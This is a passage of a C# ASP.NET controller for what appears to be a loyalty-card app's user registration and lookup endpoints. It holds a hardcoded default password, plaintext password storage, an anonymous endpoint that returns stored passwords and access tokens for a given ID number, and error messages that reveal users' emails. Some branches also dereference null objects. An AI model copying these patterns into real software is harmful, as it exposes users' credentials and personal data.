        //        return new JsonResult(new { mesanje = "Procedimiento Desactivado", code = 200 });

        //    }
        //    catch (Exception e)
        //    {
        //        return new JsonResult(new { mesanje = "Error - "+e.Message, code = 500 });
        //    }
        //}



        private void UpdateUser(Usuario usuario, Clientes cliente)
        {
            cliente.Usuario=usuario;
            usuario.Clientes=cliente;
            usuario.Personas=cliente.Persona;
            _context.Update(usuario);
            _context.SaveChanges();
        }


        private bool CreateUser(string UserName, string Email, int token, string password = "xahs567g")
        {
            try
            {
                var user = new Usuario()
                {
                    UserName = UserName,
                    Email = Email,
                    Token = token
                };
                var result = _userService.CreateAsync(user, password);
                return result.Result.Succeeded;
            }
            catch (Exception)
            {

                return false;
            }

        }
        private Usuario CreateOrUpdateUser(Usuario usuario, Clientes clienteLocal = null, string mail = null, int token = 0, string password = "xahs567g")
        {
            try
            {
                if (usuario!=null)
                {
                    Clientes Cliente = _context.Clientes.Where(x => x.UsuarioId==usuario.Id).FirstOrDefault();
                    if (Cliente!=null)
                    {
                        Cliente.Persona = clienteLocal.Persona;
                        clienteLocal = Cliente;
                    }
                    UpdateUser(usuario, clienteLocal);
                    return usuario;
                }
                else
                {
                    if (CreateUser(mail, mail, token, password))
                    {
                        Usuario usuarioLocal = _context.Usuarios.FirstOrDefault(x => x.UserName == mail);
                        UpdateUser(usuarioLocal, clienteLocal);
                        return usuarioLocal;
                    }
                }
                return null;
            }
            catch (Exception e)
            {

                return null;
            }

        }


        [HttpPost]
        [Route("PreRegistro")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MPreRegistroDTO PreRegistro([FromBody] MPreRegistroDTO Registro) //Se registra por la app
        {
            var preregistro = new MPreRegistroDTO();
            preregistro=Registro;
            try
            {
                int token = common.NiumeroRandom(100000, 999999);
                string html = "";
                string email = "";
                Usuario usuario = _context.Usuarios.Where(x => x.Personas.NroTarjeta == Registro.NroTarjeta).FirstOrDefault();
                var clienteLocal = _context.Clientes.Where(x => x.Usuario.Personas.NroTarjeta == Registro.NroTarjeta).FirstOrDefault();

                

                if (usuario!=null)
                {
                    if (usuario.activo == false)
                    {
                        _context.Clientes.Remove(usuario.Clientes);
                        _context.Usuarios.Remove(usuario);
                        _context.Personas.Remove(usuario.Personas);
                        _context.SaveChanges();
                    }

                    if (Registro.FormularioRegistro == 4) // Valida el token
                    {
                        //var persona = getPersonaloanByNroTarjeta(Registro.NroTarjeta.ToString());
                        if (usuario.Token == Registro.Token)
                        {
                            /*
                            preregistro.Nombres = persona.Nombres;
                            preregistro.Apellido = persona.Apellido;
                            preregistro.eMail = persona.Email;*/
                            preregistro.Status = 200;
                            preregistro.Mensaje = "Token Valido!!";
                            return preregistro;
                        }
                        else
                        {
                            preregistro.Status = 500;
                            preregistro.Mensaje = "Token Invalido!!";
                            return preregistro;
                        }
                    }

                    if (Registro.FormularioRegistro == 3)
                    {
                        preregistro.Status = 500;
                        preregistro.Mensaje = "El Mail ya esta registrado!!";
                        return preregistro;
                    }

                    if (Registro.FormularioRegistro == 5) // Valida con la tarjeta
                    {
                        var tarjeta = NroTarjetaByNroTarjeta(Registro.NroTarjeta.ToString());
                        string result = tarjeta.NroTarjeta.TrimStart('0');
                        var cliente = _context.Personas.Where(x => x.NroTarjeta != null).Where(x => x.NroTarjeta.TrimStart('0') == result).FirstOrDefault();
                        if (cliente != null)
                        {
                            preregistro.Status = 500;
                            preregistro.Mensaje = "El Nro de Tarjeta le Pertenece a un Socio ya registrado con el mail: " + cliente.Email;
                            return preregistro;
                        }

                        if (tarjeta != null)
                        {
                            if (Registro.NroTarjeta.TrimStart('0') == tarjeta.NroTarjeta.TrimStart('0'))
                            {
                                preregistro.Status = 200;
                                preregistro.Mensaje = "Nro de tarjeta valida!!";
                                var apellido = tarjeta.Nombres.Split(',');
                                preregistro.Nombres = apellido[1];
                                preregistro.Apellido = apellido[0];
                                preregistro.eMail = tarjeta.Email;
                                preregistro.NumeroDocumento = Convert.ToInt32(tarjeta.NroDocumento);
                                preregistro.FormularioRegistro = 6;
                                return preregistro;

                            }
                            else
                            {
                                preregistro.Status = 500;
                                preregistro.Mensaje = "Nro de tarjeta Invalida!!";
                                return preregistro;
                            }
                        }
                        else
                        {
                            preregistro.Status = 500;
                            preregistro.Mensaje = "No tiene tarjeta Estancias!!";
                            return preregistro;
                        }
                    }

                    preregistro.Status = 200;
                    preregistro.Mensaje = "Socio Ya Ingresado, debera recuperar contraseña";
                    return preregistro;
                }
                else
                {
                    if (Registro.FormularioRegistro == 4) // Valida el token
                    {
                        if (usuario.Token == Registro.Token)
                        {
                            /*
                            preregistro.Nombres = persona.Nombres;
                            preregistro.Apellido = persona.Apellido;
                            preregistro.eMail = persona.Email;*/
                            preregistro.Status = 200;
                            preregistro.Mensaje = "Token Valido!!";
                            return preregistro;
                        }
                        else
                        {
                            preregistro.Status = 500;
                            preregistro.Mensaje = "Token Invalido!!";
                            return preregistro;
                        }
                    }

                    if (Registro.FormularioRegistro == 5) // Valida con la tarjeta
                    {
                        var tarjeta = NroTarjetaByNroTarjeta(Registro.NroTarjeta.ToString());
                        string result = tarjeta.NroTarjeta.TrimStart('0');
                        var cliente = _context.Personas.Where(x => x.NroTarjeta!=null).Where(x => x.NroTarjeta.TrimStart('0') == result).FirstOrDefault();
                        if (cliente!=null)
                        {
                            preregistro.Status = 500;
                            preregistro.Mensaje = "El Nro de Tarjeta le Pertenece a un Socio ya registrado con el mail: "+cliente.Email;
                            return preregistro;
                        }

                        if (tarjeta != null)
                        {
                            if (Registro.NroTarjeta.TrimStart('0') == tarjeta.NroTarjeta.TrimStart('0'))
                            {
                                preregistro.Status = 200;
                                preregistro.Mensaje = "Nro de tarjeta valida!!";
                                var apellido = tarjeta.Nombres.Split(',');
                                preregistro.Nombres = apellido[1];
                                preregistro.Apellido = apellido[0];
                                preregistro.eMail = tarjeta.Email;
                                preregistro.NumeroDocumento = Convert.ToInt32(tarjeta.NroDocumento);
                                preregistro.FormularioRegistro = 6;
                                return preregistro;

                            }
                            else
                            {
                                preregistro.Status = 500;
                                preregistro.Mensaje = "Nro de tarjeta Invalida!!";
                                return preregistro;
                            }
                        }
                        else
                        {
                            preregistro.Status = 500;
                            preregistro.Mensaje = "No tiene tarjeta Estancias!!";
                            return preregistro;
                        }
                    }

                    if (Registro.FormularioRegistro == 2)
                    {
                        preregistro.Status = 200;
                        preregistro.Mensaje = "Verifica email";
                        preregistro.FormularioRegistro = 2;
                        preregistro.eMail = Registro.eMail.ToLower().Trim();
                        return preregistro;
                    }

                    if (Registro.FormularioRegistro == 3) // Valida el mail nuevo
                    {
                        if (CreateUser(Registro.eMail, Registro.eMail, token))
                        {
                            usuario = _context.Usuarios.FirstOrDefault(x => x.UserName == Registro.eMail);
                            preregistro.Status = 200;
                            usuario.Token = token;
                            _context.Usuarios.Update(usuario);
                            _context.SaveChanges();

                            var viewHtml = RenderViewToString("Home/MailRegistro", token.ToString());
                            EnvioDeMail(Registro.eMail, "Registro de Usuario", viewHtml.Result);

                            preregistro.Mensaje = "Envio email con Token !!";
                            return preregistro;
                        }
                    }
                    if (!usuario.EmailConfirmed)
                    {
                        if (Registro.FormularioRegistro == 2)
                        {
                            preregistro.Status = 200;
                            preregistro.Mensaje = "Verifica email";
                            preregistro.FormularioRegistro = 2;
                            preregistro.eMail = Registro.eMail.ToLower().Trim();
                            return preregistro;
                        }

                        if (Registro.FormularioRegistro == 3) // Valida el mail nuevo
                        {
                            if (CreateUser(Registro.eMail, Registro.eMail, token))
                            {
                                usuario = _context.Usuarios.FirstOrDefault(x => x.UserName == Registro.eMail);
                                preregistro.Status = 200;
                                usuario.Token = token;
                                _context.Usuarios.Update(usuario);
                                _context.SaveChanges();

                                var viewHtml = RenderViewToString("Home/MailRegistro", token.ToString());
                                EnvioDeMail(Registro.eMail, "Registro de Usuario", viewHtml.Result);

                                preregistro.Mensaje = "Envio email con Token !!";
                                return preregistro;
                            }

                        }
                    }

                    if (Registro.FormularioRegistro == 3)
                    {
                        if (CreateUser(Registro.eMail, Registro.eMail, token))
                        {
                            Usuario usuarioLocal = _context.Usuarios.FirstOrDefault(x => x.UserName == Registro.eMail);
                            preregistro.Status = 200;
                            usuarioLocal.Token = token;
                            _context.Usuarios.Update(usuario);
                            _context.SaveChanges();

                            var viewHtml = RenderViewToString("Home/MailRegistro", token.ToString());
                            EnvioDeMail(Registro.eMail, "Registro de Usuario", viewHtml.Result);

                            preregistro.Mensaje = "Envio email con Token !!";
                            return preregistro;
                        }
                        else
                        {
                            preregistro.Status = 500;
                            preregistro.Mensaje = "El usuario ya se encuentra registrado.";
                            return preregistro;
                        }
                    }
                }

                preregistro.Status = 200;
                preregistro.Mensaje = "Correct0";
                return preregistro;
            }
            catch (Exception e)
            {
                preregistro.Status = 500;
                preregistro.Mensaje = "Error al PreRegistrar al Socio.";
                return preregistro;
            }
        }

        [HttpPost]
        [Route("ValidarToken")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]

        public  MRegistraPersonaDTO ValidarToken([FromBody] MRegistraPersonaDTO Registro) //Utilizado por la App Mobile
        {
            var token = 0;
            string html = "";
            string email = "";
            Usuario usuario = _context.Usuarios.Where(x => x.Personas.NroTarjeta == Registro.NroTarjeta).FirstOrDefault();
            try {
                if (usuario.Token == Registro.Token)
                {
                    usuario.activo = true;
                    _context.Usuarios.Update(usuario);
                    _context.SaveChanges();
                }
                Registro.Status = 200;
                Registro.Mensaje = "Usuario validado!";
                return Registro;
            }
            catch (Exception e) 
            {
                Registro.Status = 400;
                Registro.Mensaje = "Error de validación de token!";
                return Registro;
            }
            
        }

        [HttpPost]
        [Route("RegistraPersona21")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]

        public async Task<MRegistraPersonaDTO> RegistraPersona21([FromBody] MRegistraPersonaDTO Registro) //Utilizado por la App Mobile
        {


            var token = 0;
            var empresa = _context.Empresas.FirstOrDefault(x => x.Id == 3);
            var user = await _userService.FindByEmailAsync(Registro.Mail.ToString().Trim());
            var personaLoan = getPersonaloanByNroTarjeta(Registro.NroTarjeta.ToString());

            try
            {
                Clientes cliente = new Clientes();
                cliente.Empresa = _context.Empresas.FirstOrDefault();
                cliente.TipoCliente = _context.TiposClientes.Find(1);
                cliente.Celular = (Registro.Celular != null) ? Registro.Celular : "";
                cliente.Localidad = _context.Localidad.Find(24860);
                cliente.Provincia = _context.Provincia.Find(6);

                cliente.Persona = new DAL.Models.Persona()
                {
                    NroDocumento = personaLoan.NroDocumento.ToString(),
                    Apellido = Registro.Apellido,
                    Nombres = Registro.Nombres,
                    FechaNacimiento = Convert.ToDateTime(personaLoan.FechaNacimiento),
                    Email = Registro.Mail,
                    NroTarjeta = Registro.NroTarjeta.TrimStart('0')
                };
                if (CreateOrUpdateUser(user, cliente, Registro.Mail.Trim(), token, Registro.Password1)==null)
                {
                    Registro.Status = 500;
                    Registro.Mensaje = "Alta Invalida ";
                    return Registro;
                }
                //var result = await _userService.ChangePasswordAsync(user, "xahs567g", Registro.Password1);
                Registro.Status = 200;
                Registro.Mensaje = "Registro con Éxito.";
                return Registro;
            }
            catch (Exception e)
            {
                Registro.Status = 500;
                Registro.Mensaje = "Error.";
                return Registro;
            }


        }



        [HttpPost]
        [Route("RegistraPersona20")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]

        public async Task<MRegistraPersonaDTO> RegistraPersona20([FromBody] MRegistraPersonaDTO Registro) //Utilizado por la App Mobile
        {
            try
                {

                //var empresa = _context.Empresas.FirstOrDefault(x => x.Id == Registro.EmpresaId);
                var empresa = _context.Empresas.FirstOrDefault(x => x.Id == 3);
                var user = await _userService.FindByEmailAsync(Registro.Mail.ToString().Trim());
                var personaLoan = getPersonaloanByNroTarjeta(Registro.NroTarjeta.ToString());
                //var persona = Personaloan(Registro.NumeroDocumento.ToString());
                //var cliente = _context.Clientes.FirstOrDefault(x => x.Usuario.Personas.NroDocumento  == Registro.NumeroDocumento.ToString());
                if (user!=null && Registro.NroTarjeta!=null)
                {
                    if (user.Personas!=null)
                    {
                        user.Personas.NroTarjeta = Registro.NroTarjeta;
                        _context.Usuarios.Update(user);
                        _context.SaveChanges();
                    }
                }

                var personalocal = _context.Personas.FirstOrDefault(x => x.Email == Registro.Mail.ToString().Trim());
                var clienteLocal = _context.Clientes.FirstOrDefault(x => x.Persona.Email == Registro.Mail.ToString().Trim());
                int token = common.NiumeroRandom(100000, 999999);

                if (Registro.Password1 != Registro.Password2 || Registro.Password1 == null)
                {
                    Registro.Status = 500;
                    Registro.Mensaje = "Password No Coincidentes o Requeridas!!!";
                    return Registro;
                }

                if (empresa == null)
                {
                    Registro.Status = 500;
                    Registro.Mensaje = "Empresa Inexistente!!!";
                    return Registro;
                }

                if (clienteLocal!=null)
                {
                    if (clienteLocal.Persona!=null) // Si la persona Existe
                    {
                        if (user!=null)
                        {
                            if (clienteLocal.Id == user.Clientes.Id)
                            {
                                Registro.Status = 200;
                                Registro.Mensaje = "Socio Ya Ingresado, debera recuperar contraseña";
                                return Registro;
                            }
                            else
                            {
                                clienteLocal.RegistroMobile = true;
                                CreateOrUpdateUser(user, clienteLocal, Registro.Mail.Trim(), token, Registro.Password1);
                                var result = await _userService.ChangePasswordAsync(user, "xahs567g", Registro.Password1);
                            }
                        }
                        else
                        {
                            clienteLocal.RegistroMobile = true;
                            CreateOrUpdateUser(user, clienteLocal, Registro.Mail.Trim(), token, Registro.Password1);
                            //var result = await _userService.ChangePasswordAsync(user, "xahs567g", Registro.Password1);
                        }
                    }
                    else
                    {
                        clienteLocal.Persona = new DAL.Models.Persona()
                        {
                            NroDocumento = Registro.NumeroDocumento.ToString(),
                            Apellido = Registro.Apellido,
                            Nombres = Registro.Nombres,
                            FechaNacimiento = Convert.ToDateTime(personaLoan.FechaNacimiento),
                            Email = Registro.Mail.Trim(),
                            NroTarjeta = Registro.NroTarjeta.TrimStart('0')
                        };

                        if (Registro.NroTarjeta!=null)
                        {
                            var persona = getPersonaloanByNroTarjeta(Registro.NroTarjeta.ToString());
                            if (persona!=null)
                            {
                                clienteLocal.Persona.NroDocumento = persona.NroDocumento;
                            }
                            clienteLocal.Persona.FechaNacimiento = Convert.ToDateTime(personaLoan.FechaNacimiento);
                        }

                        clienteLocal.RegistroMobile = true;
                        CreateOrUpdateUser(user, clienteLocal, Registro.Mail.Trim(), token, Registro.Password1);
                        var result = await _userService.ChangePasswordAsync(user, "xahs567g", Registro.Password1);

                    }
                }
                else
                {
                    Clientes cliente = new Clientes();
                    cliente.Empresa = _context.Empresas.FirstOrDefault();
                    cliente.TipoCliente = _context.TiposClientes.Find(1);
                    cliente.Celular = (Registro.Celular != null) ? Registro.Celular : "";
                    cliente.Localidad = _context.Localidad.Find(24860);
                    cliente.Provincia = _context.Provincia.Find(6);

                    DAL.Models.Persona personaLocal = _context.Personas.Where(x => x.Email==Registro.Mail.Trim()).FirstOrDefault();

                    if (personaLocal!=null)
                    {
                        cliente.Persona = personaLocal;
                        cliente.RegistroMobile = true;
                        user = CreateOrUpdateUser(user, cliente, Registro.Mail.Trim(), token, Registro.Password1);
                        var result = await _userService.ChangePasswordAsync(user, "xahs567g", Registro.Password1);
                    }
                    else
                    {
                        cliente.Persona = new DAL.Models.Persona()
                        {
                            NroDocumento = Registro.NumeroDocumento.ToString(),
                            Apellido = Registro.Apellido,
                            Nombres = Registro.Nombres,
                            FechaNacimiento = personaLoan.FechaNacimiento!=""?Convert.ToDateTime(personaLoan.FechaNacimiento): Convert.ToDateTime("01/01/1111"),
                            Email = Registro.Mail.Trim(),
                            NroTarjeta = Registro.NroTarjeta.TrimStart('0')
                        };
                        if (Registro.NroTarjeta!=null)
                        {
                            var persona = getPersonaloanByNroTarjeta(Registro.NroTarjeta.ToString());
                            if (persona!=null)
                            {
                                cliente.Persona.NroDocumento = persona.NroDocumento;
                            }
                        }

                        cliente.RegistroMobile = true;
                        user = CreateOrUpdateUser(user, cliente, Registro.Mail.Trim(), token, Registro.Password1);
                        var result = await _userService.ChangePasswordAsync(user, "xahs567g", Registro.Password1);
                    }
                }
                user = await _userService.FindByEmailAsync(Registro.Mail.ToString().Trim());
                if (user !=null)
                {
                    user.EmailConfirmed = true;
                    user.Password = Registro.Password1;

                    // Generar un token de reseteo de contraseña
                    var tokenReset = await _userService.GeneratePasswordResetTokenAsync(user);
                    var result = await _userService.ResetPasswordAsync(user, tokenReset, Registro.Password1);
                    // 6/10
                    user.Token = token;
                    user.activo = false;
                    var preCategoria = _context.PreRegistroCategorias.Where(x => x.DNI==user.Personas.NroDocumento).FirstOrDefault();
                    if (preCategoria!=null && preCategoria.Categoria != null)
                    {
                        user.UsuariosCategorias = preCategoria.Categoria;
                    }
                    else
                    {
                        user.UsuariosCategorias = _context.UsuariosCategorias.Where(x => x.Id==5).FirstOrDefault();
                    }

                    var moroso = _context.Morosos.Where(x => x.DNI == user.Personas.NroDocumento).FirstOrDefault();
                    if (moroso != null)
                    {
                        user.Incobrable = true;
                    }
                    else
                    {
                        user.Incobrable = false;
                    }
                    _context.Usuarios.Update(user);
                    _context.SaveChanges();
                    Registro.Status = 200;
                    Registro.Mensaje = "Registro con Éxito, recibiras un correo para validar la cuenta!";

                    //Envio de Token al Mail.
                    var viewHtml = RenderViewToString("Home/MailValidaToken", token.ToString());
                    EnvioDeMail(user.UserName, "Validar Email", viewHtml.Result);


                    return Registro;
                }
                else
                {
                    Registro.Status = 500;
                    Registro.Mensaje = "Error al Registrar al Socio.";
                    return Registro;
                }

            }
            catch (Exception e)
            {
                Registro.Status = 500;
                Registro.Mensaje = e.Message;
                return Registro;
            }

        }




        [HttpPost]
        [Route("ObtenerNroTarjeta")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]

        public MNroTarjetaDTO ObtenerNroTarjeta([FromBody] MNroTarjetaDTO Registro) //Utilizado por la App Mobile
        {
            if (Registro.NumeroDocumento == null || Registro.NumeroDocumento == 0)
            {
                Registro.Status = 500;
                Registro.Mensaje = "El Número de Documento no es válido";
                return Registro;
            }
            if (Registro.CodUnit != "CA04C3583703AB8258948020630BF1A3C8E0AA0EF1A8F3781F927FE62CE1F70F")
            {
                Registro.Status = 500;
                Registro.Mensaje = "El Hash no es válido";
                return Registro;
            }
            var persona = Personaloan(Registro.NumeroDocumento.ToString());

            if (persona == null)
            {
                Registro.Status = 500;
                Registro.Mensaje = "La persona no tiene tarjeta CPE";
                return Registro;
            }
            var personaLocal = _context.Usuarios.Where(x => x.Personas.NroDocumento == Registro.NumeroDocumento.ToString()).FirstOrDefault();
            if (personaLocal != null)
            {
                Registro.Mail = personaLocal.UserName;
                Registro.Password= personaLocal.Password;
                Registro.Apellido = personaLocal.Personas.Apellido;
                Registro.Nombre = personaLocal.Personas.Nombres;

                var uat = _context.UAT.Where(x => x.Cliente.Id == personaLocal.Clientes.Id).FirstOrDefault();
                if (uat != null)
                {
                    Registro.UAT = uat.Token;
                }
            }
            var tarjeta = NroTarjetaloan(Registro.NumeroDocumento.ToString());
            if (tarjeta != null)
            {
                Registro.NroTarjeta = tarjeta.NroTarjeta;
            }
            Registro.Status = 200;
            Registro.Mensaje = "Exito";
            return Registro;
        }




        [HttpPost]
        [Route("RecibirResumen")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]

        public MRecibirResumenDTO RecibirResumen([FromBody] MRecibirResumenDTO request) //Utilizado por la App Mobile
        {
            try
            {
                var uat = _context.UAT.Where(x => x.Token == request.UAT).FirstOrDefault();
                if (uat == null)
                {
                    request.Status = 500;
                    request.Mensaje = "UAT Inválida";
                    return request;
                }
                if (uat.Cliente == null)
                {
                    request.Status = 500;
                    request.Mensaje = "Cliente no válido";
                    return request;
                }

                uat.Cliente.Usuario.RecibirResumen = request.RecibirResumen;
                _context.Usuarios.Update(uat.Cliente.Usuario);
                _context.SaveChanges();

                if (request.RecibirResumen)
                {
                    request.Mensaje = "Suscripto a Resumen Mensual";
                }
                else
                {
                    request.Mensaje = "Suscripcion cancelada";
                }

                request.Status = 200;
                return request;
            }
            catch (Exception e)
            {
                request.Status = 500;
                request.Mensaje = "Error - " + e.Message;
                return request;
            }            
        }


        private PersonaLoan Personaloan(string dni) //Obtiene la persona y me comprueba la existensia de la persona.
        {
            BDExternaPersonalService consulta = new BDExternaPersonalService(_context);
            var persona = consulta.getPersonaloan(dni)?.FirstOrDefault();
            if (persona != null)
            {
                return persona;
            }
            else
                return null;
        }

        private PersonaLoan getPersonaloanByNroTarjeta(string nroTarjeta) //Obtiene la persona y me comprueba la existensia de la persona.
        {
            BDExternaPersonalService consulta = new BDExternaPersonalService(_context);
            var persona = consulta.getPersonaloanByNroTarjeta(nroTarjeta)?.FirstOrDefault();
            if (persona != null)
            {
                return persona;
            }
            else
                return null;
        }

        private PersonaLoan PersonaloanByEmail(string dni) //Obtiene la persona y me comprueba la existensia de la persona.
        {
            BDExternaPersonalService consulta = new BDExternaPersonalService(_context);
            var persona = consulta.getPersonaloanByEmail(dni)?.FirstOrDefault();
            if (persona != null)
            {
                return persona;
            }
            else
                return null;
        }


        private PersonaLoan NroTarjetaloan(string dni) //Obtiene Nro Tarjeta Estancias.
        {
            BDExternaPersonalService consulta = new BDExternaPersonalService(_context);
            var persona = consulta.getNroTarjetaloan(dni)?.FirstOrDefault();
            if (persona != null)
            {
                return persona;
            }
            else
                return null;
        }

        private PersonaLoan NroTarjetaByNroTarjeta(string dni) //Obtiene Nro Tarjeta Estancias.
        {
            BDExternaPersonalService consulta = new BDExternaPersonalService(_context);
            var persona = consulta.getPersonaloanByNroTarjeta(dni)?.FirstOrDefault();
            if (persona != null)
            {
                return persona;
            }
            else
                return null;
        }



        //------------------Registro Mobile -------------------------//
        public class RegistroPersonaService
        {
            private readonly HttpClient _httpClient;
            private const string ApiBaseUrl = "https://el-servidor/api";

            public RegistroPersonaService()
            {
                _httpClient = new HttpClient();
            }

            public async Task<string> RegistrarPersonaAsync(MRegistraPersonaDTO registro)
            {
                try
                {
                    string apiUrl = $"{ApiBaseUrl}/RegistraPersona20";
                    string json = JsonConvert.SerializeObject(registro);
                    var content = new StringContent(json, Encoding.UTF8, "application/json");

                    HttpResponseMessage response = await _httpClient.PostAsync(apiUrl, content);

                    if (response.IsSuccessStatusCode)
                    {
                        string responseContent = await response.Content.ReadAsStringAsync();
                        MRegistraPersonaDTO responseDto = JsonConvert.DeserializeObject<MRegistraPersonaDTO>(responseContent);
                        return responseDto.Mensaje;
                    }
                    else
                    {
                        return "Error al registrar la persona.";
                    }
                }
                catch (Exception ex)
                {
                    return $"Error: {ex.Message}";
                }
            }
        }

        //Obtener movimientos de tarjetas de credito
        public class MovimientosTarjetaService
        {
            private readonly HttpClient _httpClient;
            private const string ApiBaseUrl = "https://tu-servidor/api"; // Cambiar esto a la URL correcta del server

            public MovimientosTarjetaService()
            {
                _httpClient = new HttpClient();
            }

            public async Task<List<ListaMovimientoTarjetaDTO>> ObtenerMovimientosAsync(int tarjetaId)
            {
                try
                {
                    string apiUrl = $"{ApiBaseUrl}/ObtenerMovimientos"; // Cambiar esto al endpoint que va
                    string queryString = $"?tarjetaId={tarjetaId}";
                    HttpResponseMessage response = await _httpClient.GetAsync(apiUrl + queryString);

                    if (response.IsSuccessStatusCode)
                    {
                        string responseContent = await response.Content.ReadAsStringAsync();
                        List<ListaMovimientoTarjetaDTO> movimientos = JsonConvert.DeserializeObject<List<ListaMovimientoTarjetaDTO>>(responseContent);
                        return movimientos;
                    }
                    else
                    {
                        return new List<ListaMovimientoTarjetaDTO>();
                    }
                }
                catch (Exception ex)
                {
                    // Manejo de errores
                    return new List<ListaMovimientoTarjetaDTO>();
                }
            }
        }

        //Listar las tarjetas de credito

        public class TarjetasCreditoService
        {
            private readonly HttpClient _httpClient;
            private const string ApiBaseUrl = "https://tu-servidor/api";

            public TarjetasCreditoService()
            {
                _httpClient = new HttpClient();
            }

            public async Task<List<ListaMovimientoTarjetaDTO>> ObtenerTarjetasPorUsuarioAsync(string usuarioId)
            {
                try
                {
                    string apiUrl = $"{ApiBaseUrl}/ObtenerTarjetasPorUsuario"; // Poner el endpoint que va
                    string queryString = $"?usuarioId={usuarioId}";
                    HttpResponseMessage response = await _httpClient.GetAsync(apiUrl + queryString);

                    if (response.IsSuccessStatusCode)
                    {
                        string responseContent = await response.Content.ReadAsStringAsync();
                        List<ListaMovimientoTarjetaDTO> tarjetas = JsonConvert.DeserializeObject<List<ListaMovimientoTarjetaDTO>>(responseContent);
                        return tarjetas;
                    }
                    else
                    {
                        return new List<ListaMovimientoTarjetaDTO>();
                    }
                }
                catch (Exception ex)
                {
                    // Manejo de errores
                    return new List<ListaMovimientoTarjetaDTO>();
                }
            }
        }


        [HttpPost]
        [Route("TraeSucursales")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public async Task<TraeSucursalesDTO> TraeSucursales([FromBody] TraeSucursalesDTO sucursalesDTO)
        {
            //var tipopersona = _context.TiposPersonas.Where(x => x.Organismo.Descripcion != "Ejercito").OrderBy(x => x.Organismo.Orden);
            var sucursales = _context.Sucursales.OrderBy(x => x.Id);
            if (sucursales != null)
            {
                sucursalesDTO.Status = 200;
                sucursalesDTO.Mensaje = "Ok";
                List<SucursalesDTO> lista = new List<SucursalesDTO>();
                foreach (var sucu in sucursales)
                {
                    var Sucursal = new SucursalesDTO();
                    Sucursal.name = sucu.name;
                    Sucursal.Marcas = _context.SucursalesMarcas
                                        .Where(sm => sm.Sucursales.Id == sucu.Id)
                                        .Select(sm => sm.Marca.Nombre)
                                        .ToList();
                    Sucursal.address = sucu.address;
                    Sucursal.group = sucu.group;
                    Sucursal.phone = sucu.phone;
                    Sucursal.latitude = sucu.latitude;
                    Sucursal.longitude = sucu.longitude;

                    lista.Add(Sucursal);
                }
                sucursalesDTO.Sucursales = lista;

            }
            else
            {
                sucursalesDTO.Status = 500;
                sucursalesDTO.Mensaje = "Lista Inexistente";
            }
            return sucursalesDTO;
        }


        [HttpPost]
        [Route("JsonSucursales")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]

        public async Task<int> JsonSucursales()
        {
            string path = @"C:\Users\Licha\locales.json";
            using (StreamReader jsonStream = System.IO.File.OpenText(path))
            {
                var json = jsonStream.ReadToEnd();
                var sucursalesjson = JsonConvert.DeserializeObject<List<SucursalesDTO>>(json);


                List<Sucursales> sucursales = new List<Sucursales>();
                foreach (var sujson in sucursalesjson)
                {
                    var sucu = new Sucursales();
                    sucu.name = sujson.name;
                    sucu.address = sujson.address;
                    sucu.group = sujson.group;
                    sucu.phone = sujson.phone;
                    sucu.latitude = sujson.latitude.ToString();
                    sucu.longitude = sujson.longitude.ToString();

                    sucursales.Add(sucu);
                }
                if (sucursales.Count() > 0)
                {
                    _context.Sucursales.AddRange(sucursales);
                    await _context.SaveChangesAsync();
                }


                return 1;
            }

        }

        private async Task<string> RenderViewToString(string viewName, string model)
        {
            var httpContext = new DefaultHttpContext { RequestServices = _serviceProvider };
            var actionContext = new ActionContext(httpContext, new RouteData(), new ActionDescriptor());

            using (var sw = new StringWriter())
            {
                var viewResult = _viewEngine.FindView(actionContext, viewName, false);

                if (viewResult.View == null)
                {
                    throw new ArgumentNullException($"No se pudo encontrar la vista '{viewName}'");
                }

                var viewDictionary = new ViewDataDictionary(new EmptyModelMetadataProvider(), new ModelStateDictionary())
                {
                    Model = model
                };

                var viewContext = new ViewContext(
                    actionContext,
                    viewResult.View,
                    viewDictionary,
                    new TempDataDictionary(actionContext.HttpContext, _serviceProvider.GetRequiredService<ITempDataProvider>()),
                    sw,
                    new HtmlHelperOptions()
                );

                await viewResult.View.RenderAsync(viewContext);

                string html = sw.ToString();
                string textoModificado = html.Replace("TextoTokenReemplazar", model);

                return textoModificado;
            }
        }

        private void EnvioDeMail(string email, string titulo, string texto)
        {
            if (test)
            {
                //common.EnviarMail(CorreTest, titulo, texto, "");
                var mail = new MailAPI { Mail = CorreTest, Titulo = titulo, Html = texto };
                _mailService.EnviarAsync(mail);
            }
            else
            {
                //common.EnviarMail(email, titulo, texto, "");
                var mail = new MailAPI { Mail = email, Titulo = titulo, Html = texto };
                _mailService.EnviarAsync(mail);
            }
        }

        [HttpPost]
        [Route("Destroy")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MUserDestroyDTO Destroy([FromBody] MUserDestroyDTO cuerpo)
        {
            cuerpo.Status = 200;
            cuerpo.Mensaje = "Ok";
            return cuerpo;
        }


        [HttpPost]
        [Route("VerificarDocumento")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MVerificarDocumentoDTO VerificarDocumento([FromBody] MVerificarDocumentoDTO uat)
        {
            try
            {
                var Uat = _context.UAT.FirstOrDefault(x => x.Token == uat.UAT);
                if (uat == null)
                {
                    uat.Status = 500;
                    uat.Mensaje = "UAT Invalida";
                    return uat;
                }
                var Persona = Uat.Cliente.Persona;

                if (uat.NumeroDocumento==null)
                {
                    if (Convert.ToInt32(Persona.NroDocumento)!=0)
                    {
                        uat.TieneDocumento = true;
                        uat.NumeroDocumento = Persona.NroDocumento;
                    }
                    else
                    {
                        uat.TieneDocumento = false;
                    }
                }
                else
                {
                    Persona.NroDocumento = uat.NumeroDocumento;
                    _context.Update(Persona);
                    _context.SaveChanges();
                    uat.TieneDocumento = true;
                }
                uat.Status = 200;
                uat.Mensaje = "Ok";
                return uat;
            }
            catch (Exception)
            {
                uat.Status = 200;
                uat.Mensaje = "Error al buscar los datos Personales";
                return uat;
            }

        }


    }
}